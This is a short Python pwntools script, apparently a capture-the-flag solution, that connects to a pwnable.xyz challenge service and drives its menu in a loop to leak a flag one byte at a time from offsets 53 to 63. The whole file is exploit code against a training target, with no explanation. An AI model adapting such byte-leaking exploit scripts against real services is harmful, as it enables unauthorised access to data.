from pwn import*
import sys
#s=process("./challenge")
#pause()
s=remote("svc.pwnable.xyz","30006")
#k=sys.argv[1]
s.recv(1024)
for k in range(53,64):
		
	s.send("1\n")
	s.recv(1024)
	s.send(str(k)+"\n")
	s.recv(1024)
	s.send("2\n")
	s.recv(1024)
	s.send("3\n")
	s.recv(1024)
	s.send("y")
	s.recv(1024)
	s.send("abcd\n")
	s.recv(1024)
	s.send("1\n")
	s.recv(1024)
	s.send("64\n")
	s.recv(1024)
	s.send("3\n")
	s.recv(1024)
	s.send("n")

	print s.recv(1024)[k],

	
#WARNING: NOT IMPLEMENTED.
#Wanna take a survey instead?